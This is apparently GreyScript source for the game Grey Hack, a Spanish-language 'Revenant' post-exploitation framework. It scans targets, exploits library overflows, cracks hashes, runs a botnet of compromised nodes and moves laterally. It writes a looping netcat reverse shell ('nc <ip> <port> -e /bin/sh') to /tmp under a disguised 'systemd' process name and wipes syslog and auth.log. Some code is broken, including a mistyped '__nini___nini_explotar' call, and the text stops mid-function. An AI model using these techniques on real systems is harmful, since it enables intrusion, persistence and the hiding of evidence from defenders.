metaxploit = include_lib("/lib/metaxploit.so"); if not metaxploit then exit("Motor Nini: falta metaxploit.so")
crypto = include_lib("/lib/crypto.so"); if not crypto then exit("Motor Nini: falta crypto.so")
__nini_enjambre = []
__nini_enjambre_ejecutar = function(cmd)
  for sh in __nini_enjambre
      if typeof(sh) == "shell" then
          if cmd == "limpiar" then
              syslog = sh.host_computer.File("/var/system.log")
              if syslog then syslog.set_content("")
          else
              sh.launch("/bin/" + cmd, "")
          end if
      end if
  end for
end function
__nini_buscar_vulnerabilidad = function(ip, port)
  ns = metaxploit.net_use(ip, 1*port); if not ns then return null
  lib = ns.dump_lib; mems = metaxploit.scan(lib); v_list = []
  for m in mems
    rep = metaxploit.scan_address(lib, m); pts = rep.split("<b>")
    for p in pts
      if p.indexOf("</b>") == -1 then continue
      val = p.split("</b>")[0]
      is_bad = (val.indexOf(".so") != null or val.indexOf("decompi") == 0 or val.indexOf("search") == 0 or val.indexOf("check") == 0 or val.indexOf("Unsafe") == 0 or val.indexOf(" ") != null)
      if is_bad then continue
      v_list.push({"mem": m, "pass": val})
    end for
  end for
  if v_list.len == 0 then return null
  return {"metalib": lib, "v_list": v_list, "area": v_list[0].mem, "vuln": v_list[0].pass}
end function
__nini_explotar = function(arg1, arg2=null, arg3=null)
  v_o = null; p_e = ""; lan = null
  if typeof(arg1) == "map" and arg1.hasIndex("v_list") then; v_o = arg1; p_e = arg2; lan = arg3; end if
  if typeof(arg2) == "map" and arg2.hasIndex("v_list") then; v_o = arg2; p_e = arg1; lan = arg3; end if
  if typeof(arg3) == "map" and arg3.hasIndex("v_list") then; v_o = arg3; p_e = arg1; lan = arg2; end if
  if v_o != null then
      for v in v_o["v_list"]
          res = __nini_explotar_directo(v_o["metalib"], v["mem"], v["pass"], lan); if res then return res
          if p_e != "" then; res = __nini_explotar_directo(v_o["metalib"], v["mem"], v["pass"], p_e); if res then return res; end if
      end for
  end if
  return null
end function
__nini_obtener_shell = function(obj)
  if typeof(obj) == "shell" then obj.start_terminal
  if typeof(obj) == "computer" then obj.get_shell("root","root")
end function
__nini_crack_dic = function(content)
  lines = content.split(char(10))
  c = include_lib("/lib/crypto.so")
  if not c then return {}
  res = {}
  for line in lines
      if line == "" then continue
      parts = line.split(":")
      if parts.len == 2 then res[parts[0]] = c.decipher(parts[0], parts[1])
  end for
  return res
end function
__nini_pedir = function(msg)
  return user_input("<color=#00e5ff>" + msg + " </color>")
end function
__nini_xor = function(a, b)
  res = 0; p = 1
  while a > 0 or b > 0
    a_bit = a % 2; b_bit = b % 2
    if a_bit != b_bit then res = res + p
    a = floor(a / 2); b = floor(b / 2); p = p * 2
  end while
  return res
end function
__nini_clean_logs = function()
  comp = get_shell.host_computer
  logs = "/var/system.log"
  log = comp.File(logs)
  if log then
    log.delete
    comp.touch("/var", "system.log")
  end if
end function
__nini_crackear_hash = function(user_or_hash, h=null)
  c = include_lib("/lib/crypto.so")
  if not c then return null
  // Soporta: crackear_hash(usuario, hash) o crackear_hash(hash)
  if h != null then return c.decipher(user_or_hash, h)
  // Si solo se pasa un argumento, asumir que es hash y usar usuario vacio
  return c.decipher("", user_or_hash)
end function
__nini_obtener_info_libreria = function(ip, p)
  m = include_lib("/lib/metaxploit.so")
  if not m then return null
  s = m.net_use(ip, p)
  if not s then return null
  l = s.dump_lib
  if not l then return null
  return {"lib_name": l.lib_name, "version": l.version, "metalib": l}
end function
__nini_explotar_directo = function(lib, a, v, lan=null)
  if lan then return lib.overflow(a, v, lan)
  return lib.overflow(a, v)
end function
__nini_descubrir_red_local = function()
  c = get_shell.host_computer
  lip = c.local_ip
  parts = lip.split("\.")
  if parts.len < 3 then return []
  net = parts[0:3].join(".") + "."
  h = []
  for i in range(1, 254)
    ip = net + i
    if ip == lip then continue
    if get_shell.ping(ip) == 1 then h.push(ip)
  end for
  return h
end function
__nini_obtener_router_objetivo = function(ip)
  r = get_router(ip)
  if r and r.public_ip == ip then return r
  return null
end function
__nini_replicar_binario = function(s, r)
  if not s or typeof(s) != "shell" then return false
  p = get_shell.host_computer.File(program_path)
  if not p then return false
  res = s.scp(p.path, r, get_shell, 1)
  if res == 1 or res == true then return true else return false
end function
__nini_buscar_vectores_escalada = function(s)
  c = s; if typeof(s) == "shell" then c = s.host_computer
  v = []
  paths = ["/lib"]
  for p in paths
    f = c.File(p)
    if f then
      items = f.get_files + f.get_folders
      for i in items
        if i.name.indexOf(".so") >= 0 then
            v.push({"path": i.path, "type": "library (.so)", "severity": "CRITICAL"})
        end if
      end for
    end if
  end for
  return v
end function
__nini_tabla = function(headers, rows)
  strip_tags = function(s)
      res = ""; in_tag = false; tag_content = ""
      for i in range(0, s.len - 1)
          c = s[i]
          if c == "<" then
              in_tag = true; tag_content = ""
          else if c == ">" then
              in_tag = false
              is_t = (tag_content.indexOf("=") != null or tag_content.indexOf("/") == 0 or tag_content.len == 1)
              if not is_t then res = res + "<" + tag_content + ">"
          else if in_tag then
              tag_content = tag_content + c
          else
              res = res + c
          end if
      end for
      return res
  end function
  colWidths = []
  for i in range(0, headers.len - 1)
      colWidths.push(strip_tags(str(headers[i])).len)
  end for
  for row in rows
      for i in range(0, headers.len - 1)
          if i >= row.len then continue
          w = strip_tags(str(row[i])).len
          if w > colWidths[i] then colWidths[i] = w
      end for
  end for
  pad = function(s, w)
      v_l = strip_tags(str(s)).len
      if w - v_l > 0 then return str(s) + (" " * (w - v_l))
      return str(s)
  end function
  line = "<color=#00e5ff>"
  for i in range(0, headers.len - 1)
      line = line + pad(headers[i], colWidths[i]) + " | "
  end for
  print(line + "</color>")
  sep = ""
  for i in range(0, headers.len - 1)
      sep = sep + ("=" * colWidths[i]) + " + "
  end for
  print("<color=#424242>" + sep + "</color>")
  for row in rows
      line = ""
      for i in range(0, headers.len - 1)
          if i < row.len then
              line = line + pad(row[i], colWidths[i]) + " | "
          else
              line = line + (" " * colWidths[i]) + " | "
          end if
      end for
      print(line)
  end for
  return ""
end function
__nini_resolver = function(t)
  if is_valid_ip(t) then return t
  ip = nslookup(t)
  if not is_valid_ip(ip) then return null
  return ip
end function
// --- MACROS DE CONEXION REMOTA ---
__nini_conectar_ssh = function(ip, user, pass, port=22)
  return get_shell.connect_service(ip, port, user, pass)
end function
__nini_conectar_ftp = function(ip, user, pass)
  return get_shell.connect_service(ip, 21, user, pass, "ftp")
end function
__nini_conectar_net = function(ip, port=1)
  m = include_lib("/lib/metaxploit.so")
  if not m then return null
  return m.net_use(ip, port)
end function
__nini_get_router = function(ip=null)
  return get_router(ip)
end function
__nini_ping_port = function(ip, port)
  r = get_router(ip)
  if not r then return null
  return r.ping_port(port)
end function
__nini_scan_ip = function(ip)
  r = get_router(ip)
  if not r then return null
  return r.computers_lan_ip
end function
__nini_used_ports = function(ip=null)
  r = get_router(ip)
  if not r then return null
  return r.used_ports
end function
__nini_device_ports = function(ip)
  r = get_router(ip)
  if not r then return null
  return r.device_ports(ip)
end function
__nini_port_info = function(port)
  r = get_router
  if not r then return null
  return r.port_info(port)
end function
__nini_dump_lib = function(netsession)
  if not netsession then return null
  return netsession.dump_lib
end function
__nini_scan_lib = function(metalib)
  m = include_lib("/lib/metaxploit.so")
  if not m then return null
  if not metalib then return null
  return m.scan(metalib)
end function
__nini_scan_address = function(metalib, address)
  m = include_lib("/lib/metaxploit.so")
  if not m then return null
  return m.scan_address(metalib, address)
end function
__nini_overflow = function(metalib, address, value, extra=null)
  if extra then return metalib.overflow(address, value, extra)
  return metalib.overflow(address, value)
end function
__nini_launch = function(shell, program, params="")
  if not shell or typeof(shell) != "shell" then return null
  return shell.launch(program, params)
end function
__nini_scp_upload = function(shell, filePath, remotePath)
  if not shell or typeof(shell) != "shell" then return false
  local = get_shell.host_computer.File(filePath)
  if not local then return false
  return shell.scp(filePath, remotePath, get_shell, 1)
end function
__nini_scp_download = function(shell, remotePath, localPath)
  if not shell or typeof(shell) != "shell" then return false
  return shell.scp(remotePath, localPath, get_shell, 1)
end function
// --- MACROS DE PIVOTING (desde nodo comprometido) ---
__nini_get_local_ip = function(shell)
  if not shell then return null
  comp = shell.host_computer
  if not comp then return null
  return comp.local_ip
end function
__nini_get_computer = function(shell)
  if not shell then return null
  return shell.host_computer
end function
__nini_exec_from_node = function(shell, command)
  if not shell or typeof(shell) != "shell" then return null
  // Ejecuta comando en el nodo y retorna el resultado
  return shell.launch("/bin/sh", "-c " + command)
end function
__nini_scan_from_node = function(shell)
  // Escanea la red local DESDE el nodo comprometido
  if not shell then return []
  comp = shell.host_computer
  if not comp then return []
  local_ip = comp.local_ip
  if not local_ip then return []
  partes = local_ip.split(".")
  if partes.len < 3 then return []
  net = partes[0] + "." + partes[1] + "." + partes[2] + "."
  hosts = []
  for i in range(1, 254)
    ip = net + str(i)
    if ip == local_ip then continue
    if shell.ping(ip) == 1 then hosts.push(ip)
  end for
  return hosts
end function
__nini_get_router_from_node = function(shell)
  // Obtiene el router de la red del nodo comprometido
  if not shell then return null
  comp = shell.host_computer
  if not comp then return null
  local_ip = comp.local_ip
  if not local_ip then return null
  return get_router(local_ip)
end function
__nini_lan_ips_from_node = function(shell)
  // Obtiene todas las IPs en la red del nodo (desde su router)
  if not shell then return []
  router = __nini_get_router_from_node(shell)
  if not router then return []
  return router.computers_lan_ip
end function
// --- LIMPIEZA DE HUELLAS (metodo touch) ---
__nini_limpiar_logs = function(shell=null)
  // Limpia logs borrando y recreando con touch (archivo en blanco sin rastros)
  if not shell then shell = get_shell
  comp = shell.host_computer
  if not comp then return 0
  logs = [
    "/var/system.log",
    "/var/log/syslog",
    "/var/log/auth.log",
  ]
  cont = 0
  for ruta in logs
    partes = ruta.split("/")
    nombre = partes[-1]
    carpeta = "/"
    if partes.len > 2 then carpeta = partes[0:partes.len-1].join("/")
    archivo = comp.File(ruta)
    if archivo then
      archivo.delete
      comp.touch(carpeta, nombre)
      cont = cont + 1
    end if
  end for
  return cont
end function
enjambre = {}
globals.objetivo_actual = null
estado_activo = true
_historial = []
globals.ultimo_scan = []
globals.modo = "REMOTO"
iniciar_repl = function()
while (estado_activo)
dibujar_hud_tactico()
p = "<color=#00e5ff>revenant"
if (globals.objetivo_actual) then
p = p + ":" + globals.objetivo_actual
end if
p = p + ":" + globals.modo + "> "
entrada = __nini_pedir(p)
if (entrada.trim.len > 0) then
_historial.push(entrada.trim)
end if
entrada = entrada.trim.lower()
if (entrada == "break" or entrada == "x" or entrada == "q") then
print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Saliendo..." + "</color>")
globals.estado_activo = false
else if (entrada == "ayuda" or entrada == "h" or entrada == "?") then
mostrar_ayuda()
pausa_tactica()
else if (entrada == "objetivo" or entrada == "o") then
prompt_objetivo()
if (globals.objetivo_actual) then
modulo_espectro_recon()
pausa_tactica()
end if
else if (entrada.indexOf("objetivo ") == 0 or entrada.indexOf("o ") == 0) then
partes = entrada.split(" ")
if (partes.len >= 2) then
ip = __nini_resolver(partes[1])
if (ip) then
globals.objetivo_actual = ip
print("<color=#00ff41>[OK] </color><color=#ffffff>" + "Objetivo: " + globals.objetivo_actual + "</color>")
modulo_espectro_recon()
end if
end if
pausa_tactica()
else if (entrada == "menu" or entrada == "m") then
mostrar_menu_principal()
else if (entrada == "modo" or entrada == "m") then
cambiar_modo()
pausa_tactica()
else if (entrada == "recon" or entrada == "r") then
modulo_espectro_recon()
pausa_tactica()
else if (entrada == "asalto" or entrada == "a") then
modulo_asalto_root()
pausa_tactica()
else if (entrada == "vault" or entrada == "v") then
listar_credenciales()
pausa_tactica()
else if (entrada == "intel" or entrada == "i") then
modulo_intel_saquear()
pausa_tactica()
else if (entrada == "sesiones" or entrada == "ses" or entrada == "s") then
modulo_botnet_menu()
pausa_tactica()
else if (entrada == "lateral" or entrada == "lat" or entrada == "l") then
modulo_lateral_mover()
pausa_tactica()
else if (entrada == "persist" or entrada == "per" or entrada == "pe") then
modulo_persistencia_configurar()
pausa_tactica()
else if (entrada == "limpiar" or entrada == "clean" or entrada == "c") then
modulo_limpieza_ejecutar()
pausa_tactica()
else if (entrada == "historial" or entrada == "history") then
if (_historial.len == 0) then
print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Sin comandos." + "</color>")
else
i = _historial.len - 1
cont = 0
while (i >= 0 and cont < 10)
print("<color=#00e5ff>[#] </color><color=#ffffff>" + "  " + _historial[i] + "</color>")
i = i - 1
cont = cont + 1
end while
end if
pausa_tactica()
else if (entrada == "") then
else
print("<color=#ff1744>[X] </color><color=#ffffff>" + "Comando: " + entrada + "</color>")
pausa_tactica()
end if
end while
end function
mostrar_ayuda = function()
columnas = ["Comando", "Alias", "Que hace"]
filas = [
["objetivo", "o", "Fija un objetivo and escanea automatico"],
["modo", "", "Cambia entre LOCAL or REMOTO"],
["recon", "r", "Escanea puertos and servicios"],
["asalto", "a", "Explota vulnerabilidades and gana acceso"],
["vault", "v", "Muestra credenciales guardadas"],
["intel", "i", "Extrae info del objetivo (passwd, bancos, etc)"],
["sesiones", "ses", "Ver nodos comprometidos"],
["lateral", "lat", "Moverse a otros equipos de la red"],
["persist", "pe", "Instalar backdoor"],
["limpiar", "c", "Borrar logs e huellas"],
["ayuda", "h", "Esta ayuda"],
["break", "x", "Salir del framework"],
]
dibujar_tabla_simple("AYUDA - COMANDOS UTILES", columnas, filas)
end function
cambiar_modo = function()
if (globals.modo == "REMOTO") then
globals.modo = "LOCAL"
print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Modo cambiado a: LOCAL" + "</color>")
else
globals.modo = "REMOTO"
print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Modo cambiado a: REMOTO" + "</color>")
end if
end function
mostrar_menu_principal = function()
opciones = [
{"label": "Fijar Objetivo", "cmd": "o"},
{"label": "Cambiar Modo (LOCAL/REMOTO)", "cmd": "modo"},
{"label": "Escanear", "cmd": "r"},
{"label": "Asaltar", "cmd": "a"},
{"label": "Inteligencia (saquear)", "cmd": "i"},
{"label": "Ver Vault (credenciales)", "cmd": "v"},
{"label": "Sesiones (enjambre)", "cmd": "ses"},
{"label": "Movimiento Lateral", "cmd": "lat"},
{"label": "Persistencia (backdoor)", "cmd": "pe"},
{"label": "Limpiar huellas", "cmd": "c"},
]
comando = menu_interactivo("MENU", opciones)
if (comando) then
entrada = comando
end if
end function
espectro_escaneo_completo = function(host)
if (not host or host == "") then
print("<color=#ff1744>[X] </color><color=#ffffff>" + "No hay host definido." + "</color>")
return null
end if
sh = get_shell
if (sh.ping(host) != 1) then
print("<color=#ff1744>[X] </color><color=#ffffff>" + "Host inalcanzable: " + host + "</color>")
return null
end if
router = get_router(host)
if (not router) then
print("<color=#ff1744>[X] </color><color=#ffffff>" + "No se pudo obtener router." + "</color>")
return null
end if
es_local = es_ip_local(host)
ports = []
if (es_local) then
ports = router.device_ports(host)
else
ports = router.used_ports
end if
if (not ports or ports.len == 0) then
print("<color=#00e5ff>[#] </color><color=#ffffff>" + "No hay puertos abiertos." + "</color>")
return null
end if
resultados = []
i = 1
for port in ports
port_num = port.port_number
servicio_completo = router.port_info(port)
servicio = servicio_completo
version = "N/A"
partes_svc = servicio_completo.split(" ")
if (partes_svc.len > 1) then
servicio = partes_svc[0]
version = partes_svc[1]
end if
estado = "open"
if (port.is_closed and not es_local) then
estado = "closed"
end if
lan_ip = "N/A"
if (es_local) then
lan_ip = host
else
lan_ip = port.get_lan_ip
end if
resultados.push({
"id": i,
"puerto": port_num,
"servicio": servicio,
"version": version,
"estado": estado,
"lan_ip": lan_ip,
})
i = i + 1
end for
return resultados
end function
espectro_mostrar_tabla = function(resultados)
print("")
print("<color=#00e5ff>[#] </color><color=#ffffff>" + "RESULTADOS DEL ESCANEO:" + "</color>")
print("")
print("  ID  Puerto  Estado  Servicio            Version  LAN IP")
print("  --- ------  ------  ------------------ -------- ---------------")
for r in resultados
id_str = str(r.id)
puerto_str = str(r.puerto)
estado_str = r.estado
servicio_str = r.servicio
version_str = r.version
lan_str = r.lan_ip
id_str = id_str + " " * (3 - id_str.len)
puerto_str = puerto_str + " " * (6 - puerto_str.len)
estado_str = estado_str + " " * (6 - estado_str.len)
servicio_str = servicio_str + " " * (18 - servicio_str.len)
version_str = version_str + " " * (8 - version_str.len)
color_estado = ""
if (estado_str == "closed") then
color_estado = "<color=#ff3131>"
end if
print("  " + id_str + "  " + puerto_str + "  " + color_estado + estado_str + "</color>  " + servicio_str + "  " + version_str + "  " + lan_str)
end for
print("")
end function
modulo_espectro_recon = function()
if (globals.objetivo_actual == null) then
print("<color=#ff1744>[X] </color><color=#ffffff>" + "No hay objetivo. Usa 'objetivo <ip>'" + "</color>")
return
end if
host = globals.objetivo_actual
print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Escaneando " + host + "..." + "</color>")
resultados = espectro_escaneo_completo(host)
if (resultados) then
globals.ultimo_scan = resultados
espectro_mostrar_tabla(resultados)
es_local = es_ip_local(host)
modo_actual = "REMOTO"
if (es_local) then
modo_actual = "LOCAL"
end if
print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Modo: " + modo_actual + " | Puertos: " + str(resultados.len) + "</color>")
else
print("<color=#ff1744>[X] </color><color=#ffffff>" + "Sin resultados." + "</color>")
end if
end function
es_ip_local = function(ip)
if (not ip) then; return false
end if
if (ip == "127.0.0.1") then; return true
end if
comp = get_shell.host_computer
local_ip = comp.local_ip
partes_local = local_ip.split(".")
partes_ip = ip.split(".")
if (partes_local.len < 3 or partes_ip.len < 3) then; return false
end if
red_local = partes_local[0] + "." + partes_local[1] + "." + partes_local[2]
red_ip = partes_ip[0] + "." + partes_ip[1] + "." + partes_ip[2]
return red_local == red_ip
end function
modulo_asalto_root = function()
if (globals.objetivo_actual == null) then
print("<color=#ff1744>[X] </color><color=#ffffff>" + "No hay objetivo. Usa 'objetivo <ip>'" + "</color>")
return
end if
if (globals.ultimo_scan.len == 0) then
print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Escaneando objetivo..." + "</color>")
modulo_espectro_recon()
end if
sel = __nini_pedir("Puerto (ID, 0=router, Enter=todos): ")
port_int = 0
puerto_seleccionado = null
if (sel.len > 0) then
if (sel == "0") then
port_int = 0
print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Atacando router (puerto 0)..." + "</color>")
else
sel_int = val(sel)
if (sel_int > 0 and sel_int <= globals.ultimo_scan.len) then
puerto_seleccionado = globals.ultimo_scan[sel_int - 1]
port_int = puerto_seleccionado.puerto
print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Atacando puerto " + str(port_int) + "..." + "</color>")
else
port_int = val(sel)
print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Atacando puerto " + str(port_int) + "..." + "</color>")
end if
end if
else
print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Atacando todos los puertos..." + "</color>")
port_int = null
end if
if (globals.modo == "LOCAL") then
print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Modo LOCAL - escaneando librerias..." + "</color>")
ataque_local()
else
ataque_remoto(port_int)
end if
end function
ataque_local = function()
comp = get_shell.host_computer
print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Escaneando librerias in /lib..." + "</color>")
lib_folder = comp.File("/lib")
if (not lib_folder) then
print("<color=#ff1744>[X] </color><color=#ffffff>" + "No se pudo acceder a /lib" + "</color>")
return
end if
libs = []
for f in lib_folder.get_files
if (f.name.indexOf(".so") != null) then
libs.push(f)
end if
end for
if (libs.len == 0) then
print("<color=#ff1744>[X] </color><color=#ffffff>" + "No hay librerias." + "</color>")
return
end if
print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Librerias: " + str(libs.len) + "</color>")
metax = include_lib("/lib/metaxploit.so")
if (not metax) then
print("<color=#ff1744>[X] </color><color=#ffffff>" + "Metaxploit not disponible" + "</color>")
return
end if
for lib_file in libs
print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Probando: " + lib_file.name + "</color>")
lib = metax.load(lib_file.path)
if (lib) then
vulns = metax.scan(lib)
if (vulns.len > 0) then
print("<color=#00e5ff>[#] </color><color=#ffffff>" + "  Vulns: " + str(vulns.len) + "</color>")
for v in vulns
res = lib.overflow(vulns[0], "")
if (res) then
print("<color=#00ff41>[OK] </color><color=#ffffff>" + "ACCESO OBTENIDO!" + "</color>")
enjambre[globals.objetivo_actual] = res
return
end if
end for
end if
end if
end for
print("<color=#ff1744>[X] </color><color=#ffffff>" + "Sin vulnerabilidades." + "</color>")
end function
ataque_remoto = function(port_int)
host = globals.objetivo_actual
es_router = false
r = __nini_obtener_router_objetivo(host)
if (r and port_int == 0) then
es_router = true
end if
lan_target = null
if (es_router) then
print("<color=#ffea00>[!] </color><color=#ffffff>" + "ROUTER DETECTADO!" + "</color>")
opcion = __nini_pedir("Saltar a IP interna? [s/n]: ")
if (opcion.lower() == "s") then
lan_target = __nini_pedir("IP interna: ")
print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Saltando a: " + lan_target + "</color>")
end if
end if
lib_info = __nini_obtener_info_libreria(host, port_int)
vulns_cache = []
if (lib_info) then
vulns_cache = obtener_vulnerabilidades(lib_info.lib_name, lib_info.version)
end if
if (vulns_cache.len > 0) then
print("<color=#00ff41>[OK] </color><color=#ffffff>" + "Cache hit: " + lib_info.lib_name + "</color>")
for v in vulns_cache
print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Explotando: " + v.mem + "</color>")
sesion = __nini_explotar_directo(lib_info.metalib, v.mem, v.pass, lan_target)
if (typeof(sesion) == "shell" or typeof(sesion) == "computer") then
print("<color=#00ff41>[OK] </color><color=#ffffff>" + "ACCESO OBTENIDO!" + "</color>")
enjambre[host] = sesion
return
end if
end for
end if
print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Buscando vulnerabilidades..." + "</color>")
vuln = __nini_buscar_vulnerabilidad(host, port_int)
if (vuln) then
print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Vulnerabilidades: " + str(vuln.v_list.len) + "</color>")
for v in vuln.v_list
cachear_vulnerabilidad(vuln.metalib.lib_name, vuln.metalib.version, v.mem, v.pass)
end for
sesion = __nini___nini_explotar(vuln, null, lan_target)
if (typeof(sesion) == "shell" or typeof(sesion) == "computer") then
print("<color=#00ff41>[OK] </color><color=#ffffff>" + "ACCESO OBTENIDO!" + "</color>")
enjambre[host] = sesion
else
print("<color=#ff1744>[X] </color><color=#ffffff>" + "Ataque fallido." + "</color>")
end if
else
print("<color=#ff1744>[X] </color><color=#ffffff>" + "Sin vulnerabilidades." + "</color>")
end if
end function
__nini_obtener_router_objetivo = function(ip)
r = get_router(ip)
if (r and r.public_ip == ip) then
return r
end if
return null
end function
mostrar_banner_revenant = function()
clear_screen
print("<color=#00e5ff> [ ###################################################### ] </color>")
print("<color=#00e5ff> [ # ]                                              [ # ] </color>")
print("<color=#ffffff> [ # ]          R  E  V  E  N  A  N  T              [ # ] </color>")
print("<color=#ffffff> [ # ]   P O S T - E X P L O I T A T I O N          [ # ] </color>")
print("<color=#424242> [ # ]             F R A M E W O R K                [ # ] </color>")
print("<color=#424242> [ # ]                                              [ # ] </color>")
print("<color=#00e5ff> [ ###################################################### ] </color>")
print("")
end function
dibujar_separador = function(); print("<color=#424242>======================================================</color>"); end function
dibujar_separador_doble = function(); print("<color=#b537f2>======================================================</color>"); end function
limpiar_pantalla = function(); clear_screen; end function
dibujar_hud_tactico = function()
limpiar_pantalla()
mostrar_banner_revenant()
dibujar_separador()
if (not globals.objetivo_actual) then
    estado_obj = "<color=#ff3131>NINGUNO</color>"
else
    estado_obj = "<color=#00ff41>" + globals.objetivo_actual + "</color>"
end if
if (enjambre.len == 0) then
    estado_enjambre = "<color=#424242>" + str(enjambre.len) + "</color>"
else
    estado_enjambre = "<color=#00ff41>" + str(enjambre.len) + "</color>"
end if
if (globals.modo == "LOCAL") then
    modo_color = "<color=#00ff41>LOCAL</color>"
else
    modo_color = "<color=#ff3131>REMOTO</color>"
end if
print("OBJ: " + estado_obj + " | MODO: " + modo_color + " | SES: " + estado_enjambre)
dibujar_separador()
end function
dibujar_ventana = function(titulo, contenido)
dibujar_separador()
print("[#] " + titulo.upper())
dibujar_separador()
print(contenido)
dibujar_separador()
end function
dibujar_ventana_centrada = function(titulo, contenido)
dibujar_separador_doble()
print("[ " + titulo.upper() + " ]")
dibujar_separador_doble()
print(contenido)
dibujar_separador_doble()
end function
pausa_tactica = function(); __nini_pedir("<color=#424242>[ Enter ]</color>"); end function
menu_interactivo = function(titulo, opciones)
dibujar_separador_doble()
print("[ " + titulo.upper() + " ]")
dibujar_separador()
filas = []
i = 1
for opt in opciones
filas.push([i, opt.label])
i = i + 1
end for
print(__nini_tabla(["#", "Accion"], filas))
dibujar_separador()
sel = val(__nini_pedir("<color=#ffea00>Selecciona > </color>"))
if (sel > 0 and sel <= opciones.len) then; return opciones[sel - 1].cmd
end if
print("<color=#ff1744>[X] </color><color=#ffffff>" + "Selección inválida." + "</color>")
return null
end function
prompt_objetivo = function()
if (globals.objetivo_actual) then
confirm = __nini_pedir("Cambiar (" + globals.objetivo_actual + ")? [s/n]: ")
if (confirm.lower() != "s") then; return globals.objetivo_actual
end if
end if
t_obj = __nini_pedir("<color=#ffea00>IP or Dominio > </color>")
if (t_obj == "") then; return globals.objetivo_actual
end if
res = __nini_resolver(t_obj)
if (res) then
globals.objetivo_actual = res
globals.ultimo_scan = []
print("<color=#00ff41>[OK] </color><color=#ffffff>" + "Objetivo: " + res + "</color>")
return res
end if
print("<color=#ff1744>[X] </color><color=#ffffff>" + "No se pudo resolver: " + t_obj + "</color>")
return null
end function
mostrar_cargando = function(texto); print("<color=#00e5ff>Cargando " + texto + "...</color>"); end function
confirmar_accion = function(pregunta)
resp = __nini_pedir("<color=#ffea00>" + pregunta + " [s/n]: </color>")
return (resp.lower() == "s" or resp.lower() == "si" or resp.lower() == "y")
end function
modulo_botnet_menu = function()
opciones = [
{"label": "Ver nodos activos", "cmd": "info"},
{"label": "Establecer Callback (rshell)", "cmd": "callback"},
{"label": "Esperar conexiones", "cmd": "server"},
{"label": "Ejecutar comando in nodos", "cmd": "exec"},
]
modo = menu_interactivo("CONTROL DE BOTNET", opciones)
if (not modo) then; return
end if
if (modo == "info") then
modulo_botnet_info()
else if (modo == "callback") then
botnet_establecer_callback()
else if (modo == "server") then
botnet_esperar_conexiones()
else if (modo == "exec") then
botnet_ejecutar_comando()
end if
end function
modulo_botnet_info = function()
if (enjambre.len == 0) then
print("<color=#ff1744>[X] </color><color=#ffffff>" + "El enjambre esta vacio. Asalta algum objetivo primero." + "</color>")
return
end if
print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Desplegando estado del enjambre (" + enjambre.len + " nodos activos):" + "</color>")
columnas = ["IP Victima", "Tipo Acceso"]
filas = []
for nodo in enjambre
ip_nodo = nodo.key
sesion_hash = typeof(nodo.value)
filas.push([ip_nodo, sesion_hash])
end for
tabla = __nini_tabla(columnas, filas)
print(tabla)
end function
botnet_establecer_callback = function()
print("<color=#00e5ff>[#] </color><color=#ffffff>" + "CONFIGURANDO CALLBACK EN OBJETIVO..." + "</color>")
objetivo = globals.objetivo_actual
if (not objetivo) then
print("<color=#ff1744>[X] </color><color=#ffffff>" + "No hay objetivo seleccionado." + "</color>")
return
end if
tu_ip = get_shell.host_computer.local_ip
print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Tu IP (atacante): " + tu_ip + "</color>")
puerto = __nini_pedir("Puerto de callback (Enter=4444): ")
if (puerto == "") then
puerto = "4444"
end if
proceso = __nini_pedir("Nombre del proceso (Enter=systemd): ")
if (proceso == "") then
proceso = "systemd"
end if
comp = obtener_computadora_objetivo()
if (not comp) then
print("<color=#ff1744>[X] </color><color=#ffffff>" + "No hay sesion activa." + "</color>")
return
end if
contenido = "#!/bin/bash" + char(10)
contenido = contenido + "while true; do nc " + tu_ip + " " + puerto + " -e /bin/sh; sleep 60; done"
ruta_script = "/tmp/revenant_callback.sh"
archivo = comp.File(ruta_script)
if (archivo) then
archivo.set_content(contenido)
comp.chmod("+x", ruta_script)
print("<color=#00ff41>[OK] </color><color=#ffffff>" + "Callback configurado en: " + ruta_script + "</color>")
print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Para ejecutar: bash " + ruta_script + "</color>")
else
print("<color=#ff1744>[X] </color><color=#ffffff>" + "No se pudo crear el script." + "</color>")
end if
end function
botnet_esperar_conexiones = function()
print("<color=#00e5ff>[#] </color><color=#ffffff>" + "ESPERANDO CONEXIONES DE BOTNET..." + "</color>")
print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Usa 'nc -lvp <puerto>' for escuchar." + "</color>")
metax = include_lib("/lib/metaxploit.so")
if (not metax) then
print("<color=#ff1744>[X] </color><color=#ffffff>" + "Metaxploit not disponible." + "</color>")
return
end if
victims = metax.rshell_server
if (not victims or victims.len == 0) then
print("<color=#00e5ff>[#] </color><color=#ffffff>" + "No hay conexiones entrantes." + "</color>")
return
end if
print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Conexiones activas: " + str(victims.len) + "</color>")
for v in victims
print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Nodo conectado: " + typeof(v) + "</color>")
end for
end function
botnet_ejecutar_comando = function()
if (enjambre.len == 0) then
print("<color=#ff1744>[X] </color><color=#ffffff>" + "El enjambre esta vacio." + "</color>")
return
end if
comando = __nini_pedir("Comando a ejecutar: ")
if (comando == "") then; return
end if
print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Ejecutando in " + str(enjambre.len) + " nodos..." + "</color>")
for nodo in enjambre
ip_nodo = nodo.key
sesion = nodo.value
if (typeof(sesion) == "shell") then
sesion.launch("/bin/sh", "-c '" + comando + "'")
